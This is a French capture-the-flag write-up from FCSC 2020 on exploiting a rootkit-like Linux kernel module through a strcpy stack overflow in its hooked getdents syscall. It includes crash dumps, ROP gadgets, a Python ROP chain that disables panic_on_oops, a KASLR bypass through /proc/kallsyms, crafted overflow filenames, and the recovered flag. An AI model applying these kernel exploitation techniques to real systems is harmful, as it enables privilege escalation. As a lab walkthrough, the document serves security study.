<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>[FR] Write-up FCSC 2020 : Hello Rootkitty - redoste</title><link rel=stylesheet type=text/css href=/css/main.css></head><body><header><a href=/><h2>redoste</h2></a><nav><ul><li><a href=/about/>About</a></li><li><a href=/projects/>Projects</a></li><li><a href=/posts/index.xml>RSS</a></li></ul></nav></header><hr><main><h2>[FR] Write-up FCSC 2020 : Hello Rootkitty</h2><span class=date>2020-05-04 18:00 +0200</span><hr><nav><ul><li><a href=/tags/ctf/>CTF</a></li><li><a href=/tags/fcsc/>FCSC</a></li><li><a href=/tags/fcsc-2020/>FCSC 2020</a></li></ul></nav><hr><h1 id=i---intro>I - Intro</h1><p>Le challenge se compose d&rsquo;un module Linux pour un kernel <code>4.14.167 amd64</code>. Celui-ci est chargé automatiquement dans une VM Qemu accessible via une connexion ssh sur la machine hôte.</p><h1 id=ii---analyse-statique-et-le-buffer-overflow>II - Analyse statique et le buffer overflow</h1><p>Après une analyse statique du binaire avec <em>Ghidra</em>, nous remarquons que le module va modifier la table des syscalls et remplacer les syscalls <code>lstat</code>, <code>getdents</code> et <code>getdents64</code>.
Ces versions modifiées des syscalls vont faire appel aux syscalls d&rsquo;origine et modifier leur retour de manière à masquer les informations à propos des fichiers commençant par <code>ecsc_flag_</code>. Le but est donc de trouver un moyen de contourner cette restriction de manière à pouvoir lire le fichier contenant le flag à la racine de la machine.</p><p>Après analyse de la version modifiée des syscalls, quelque chose de plutôt important est visible dans <code>ecsc_sys_getdents</code> et <code>ecsc_sys_getdents64</code>. Lorsque le module va lire ou écrire les noms des fichiers qu&rsquo;il traite, il utilise la fonction <code>strcpy</code> ne possédant pas de protection contre une attaque de type <em>buffer overflow</em>. Comme le module ne possède pas de protection à base de <em>stack cookie</em>, il est possible d&rsquo;utiliser un nom de fichier tellement long que l&rsquo;adresse de retour de la fonction soit modifié nous permettant donc d&rsquo;exécuter n&rsquo;importe quel code avec les privilèges du kernel.</p><p>En utilisant un simple pattern, on peut facilement trouver quel caractère permet de contrôler <code>RIP</code> :</p><pre tabindex=0><code>~ $ touch ecsc_flag_Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8A
c9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4A
g5Ag
~ $ ls
general protection fault: 0000 [#1] NOPTI
Modules linked in: ecsc(O)
CPU: 0 PID: 55 Comm: ls Tainted: G           O    4.14.167 #11
task: ffffa0a441c0a200 task.stack: ffffab2f4009c000
RIP: 0010:0x6441356441346441
RSP: 0018:ffffab2f4009ff38 EFLAGS: 00000282
RAX: 0000000000000548 RBX: 3563413463413363 RCX: 0000000000000000
RDX: 00007fff8b7c75a6 RSI: ffffab2f4009ff93 RDI: 00007fff8b7c74d3
RBP: 3364413264413164 R08: ffffab2f4009fed0 R09: ffffffffc02d2024
R10: ffffab2f4009fec0 R11: 6741346741336741 R12: 634137634136641
R13: 4130644139634138 R14: 0000000000000000 R15: 0000000000000000
FS:  0000000000000000(0000) GS:ffffffffbcc36000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 000000000124a138 CR3: 0000000001c7e000 CR4: 00000000000006b0
Call Trace:
Code:  Bad RIP value.
RIP: 0x6441356441346441 RSP: ffffab2f4009ff38
---[ end trace 39fccfc1f117da86 ]---
Segmentation fault
</code></pre><p><code>RIP</code> est donc contrôlé par le 102ème caractère.</p><h1 id=iii---création-dune-rop-chain-pour-désactiver-oopspanic>III - Création d&rsquo;une <em>ROP chain</em> pour désactiver <code>oops=panic</code></h1><p>L&rsquo;un des principal problème rencontré est la présence de l&rsquo;option <code>oops=panic</code> dans la ligne de commande du kernel, cette option provoque un kernel panic au moindre kernel oops or un kernel oops se produit lorsque quelque chose segfault dans le kernel mais que cela n&rsquo;impactera pas complètement la stabilité du système. Il serait plutôt complexe de réussir à créer un exploit qui retourne dans un état stable sans provoquer un kernel oops, le plus simple reste donc de désactiver l&rsquo;option <code>oops=panic</code> avant d&rsquo;exécuter l&rsquo;exploit final.</p><p>L&rsquo;option <code>oops=panic</code> est représentée par la <a href=https://elixir.bootlin.com/linux/v4.14.167/source/kernel/panic.c#L35>variable globale <code>panic_on_oops</code></a>, il faudrait donc construire une <em>ROP chain</em> permettant de mettre sa valeur à 0. Pour trouver les gadgets à utiliser il faut d&rsquo;abord extraire le ELF original du kernel car celui-ci est compressé, ici en gzip, <code>binwalk</code> permet d&rsquo;obtenir l&rsquo;offset des données compressées puis <code>gunzip</code> permet de les décompresser.</p><p>On peut ensuite utiliser <em><a href=https://github.com/JonathanSalwan/ROPgadget>ROPGadget</a></em> pour trouver des gadgets intéressants, voici ceux que j&rsquo;ai choisi :</p><pre tabindex=0><code>0xffffffff81269eee : pop rsi ; ret                                  [G1]
0xffffffff8115fac8 : mov dword ptr [rsi], 0 ; xor eax, eax ; ret    [G2]
</code></pre><p>Ils sont plutôt simple a utiliser et ont peux d&rsquo;effets secondaires. On peut donc construire la <em>ROP chain</em> de cette manière :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>ropchain <span style=color:#f92672>=</span> (<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>102</span>) <span style=color:#f92672>+</span> struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#34;Q&#34;</span>, A_G1) <span style=color:#f92672>+</span> struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#34;Q&#34;</span>, A_oops) <span style=color:#f92672>+</span> struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#34;Q&#34;</span>, A_G2) <span style=color:#f92672>+</span> (<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;I&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>)
</span></span></code></pre></div><p>Il ne faut pas oublier de prendre en compte l&rsquo;ASLR du kernel mais celle-ci peut être facilement contrée car ses symboles sont accessibles via <code>/proc/kallsyms</code>, il suffit alors de comparer l&rsquo;adresse de <code>startup_64</code> exposée par <code>kallsyms</code> avec celle du ELF du kernel.</p><h1 id=iv---restauration-des-vrais-syscalls>IV - Restauration des vrais syscalls</h1><p>Pour restaurer les vrais syscalls <code>lstat</code>, <code>getdents</code> et <code>getdents64</code>, la méthode la plus simple et d&rsquo;appeler la fonction <code>cleanup_module</code> du module. Les symboles du module sont eux aussi exposés par <code>kallsyms</code>.</p><p>En combinant ceci avec la <em>ROP chain</em> du paragraphe précédant, il est possible de retrouver le nom des fichiers commençant par <code>ecsc_flag_</code> :</p><pre tabindex=0><code>~ $ cat /proc/kallsyms  | head
ffffffff8fe00000 T startup_64
ffffffff8fe00000 T _stext
ffffffff8fe00000 T _text
ffffffff8fe00030 T secondary_startup_64
ffffffff8fe000e0 T verify_cpu
ffffffff8fe001e0 T __startup_64
ffffffff8fe00390 T __startup_secondary_64
ffffffff8fe00398 t sanitize_boot_params.constprop.1
ffffffff8fe00430 t run_init_process
ffffffff8fe00460 t try_to_run_init_process
~ $ touch &#34;$(printf &#39;ecsc_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAA\xee\x9e\x06\x90\xff\xff\xff\xff\xb8K\x91\x90\xff\xff\xff\xff\xc8\xfa\xf5\x8f\xff
\xff\xff\xffIIIIIIII&#39;)&#34;
~ $ ls
general protection fault: 0000 [#1] NOPTI
Modules linked in: ecsc(O)
CPU: 0 PID: 71 Comm: ls Tainted: G           O    4.14.167 #11
task: ffff9a8681e1aa80 task.stack: ffffb9094009c000
RIP: 0010:0x4949494949494949
RSP: 0018:ffffb9094009ff50 EFLAGS: 00000246
RAX: 0000000000000000 RBX: 4141414141414141 RCX: 0000000000000000
RDX: 00007ffed4099884 RSI: ffffffff90914bb8 RDI: 00007ffed40997f3
RBP: 4141414141414141 R08: ffffb9094009fed0 R09: ffffffffc01a7024
R10: ffffb9094009fec0 R11: ff8ff5fac8ffffff R12: 4141414141414141
R13: 4141414141414141 R14: 0000000000000000 R15: 0000000000000000
FS:  0000000000000000(0000) GS:ffffffff90836000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007ffed40997b0 CR3: 0000000001eae000 CR4: 00000000000006b0
Call Trace:
 ? __kprobes_text_end+0x129b78/0x129b78
Code:  Bad RIP value.
RIP: 0x4949494949494949 RSP: ffffb9094009ff50
---[ end trace 7b7d593635ea5627 ]---
Segmentation fault
~ $ rm &#34;$(printf &#39;ecsc_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAA\xee\x9e\x06\x90\xff\xff\xff\xff\xb8K\x91\x90\xff\xff\xff\xff\xc8\xfa\xf5\x8f\xff\xff
\xff\xffIIIIIIII&#39;)&#34;
~ $ ls
~ $ cat /proc/kallsyms | grep ecsc
ffffffffc01a82c8 b ref_sys_getdents64	[ecsc]
ffffffffc01a82d0 b ref_sys_getdents	[ecsc]
ffffffffc01a82c0 b ref_sys_lstat	[ecsc]
ffffffffc01a82e0 b my_sys_call_table	[ecsc]
ffffffffc01a82d8 b original_cr0	[ecsc]
ffffffffc01a636e t ecsc_end	[ecsc]
ffffffffc01a8000 d __this_module	[ecsc]
ffffffffc01a6150 t ecsc_sys_getdents	[ecsc]
ffffffffc01a636e t cleanup_module	[ecsc]
ffffffffc01a62a0 t ecsc_sys_lstat	[ecsc]
ffffffffc01a6000 t ecsc_sys_getdents64	[ecsc]
~ $ touch &#34;$(printf &#39;ecsc_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAnc\x1a\xc0\xff\xff\xff\xff&#39;)&#34;
~ $ ls
BUG: unable to handle kernel NULL pointer dereference at           (null)
IP:           (null)
PGD 1e86067 P4D 1e86067 PUD 1e87067 PMD 0
Oops: 0010 [#2] NOPTI
Modules linked in: ecsc(O)
CPU: 0 PID: 84 Comm: ls Tainted: G      D    O    4.14.167 #11
task: ffff9a8681e1b300 task.stack: ffffb9094009c000
RIP: 0010:          (null)
RSP: 0018:ffffb9094009ff40 EFLAGS: 00000246
RAX: 0000000000000000 RBX: 4141414141414141 RCX: ffff9a8681e1b940
RDX: 0000000000000000 RSI: 0000000080000000 RDI: ffffffff9081b4c0
RBP: 4141414141414141 R08: ffff9a8681e1b358 R09: 0000000000000000
R10: ffffb9094009ff20 R11: ffff9a8680033348 R12: 4141414141414141
R13: 4141414141414141 R14: 0000000000000000 R15: 0000000000000000
FS:  0000000000000000(0000) GS:ffffffff90836000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000000000000 CR3: 0000000001eb8000 CR4: 00000000000006b0
Call Trace:
 ? entry_SYSCALL_64_after_hwframe+0x3d/0xa2
Code:  Bad RIP value.
RIP:           (null) RSP: ffffb9094009ff40
CR2: 0000000000000000
---[ end trace 7b7d593635ea5628 ]---
Killed
~ $ ls
ecsc_flag_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAnc??????
~ $ cd ..
/home $ ls
ctf
/home $ cd ..
/ $ ls
bin
dev
ecsc_flag_cf785ee0b5944f93dd09bf1b1b2c6da7fadada8e4d325a804d1dde2116676126
etc
home
init
lib
mnt
proc
root
run
sys
tmp
var
/ $ cat ecsc_flag_cf785ee0b5944f93dd09bf1b1b2c6da7fadada8e4d325a804d1dde21166761
26
ECSC{c0d801fb2045ddb0ab27766e52b7654ccde41b5fc00d07fa908fefa30b45b8a5}
</code></pre></main><hr><footer>© 2020 - 2022 redoste - <a href=https://creativecommons.org/licenses/by/4.0/>CC-BY-4.0</a></footer></body></html>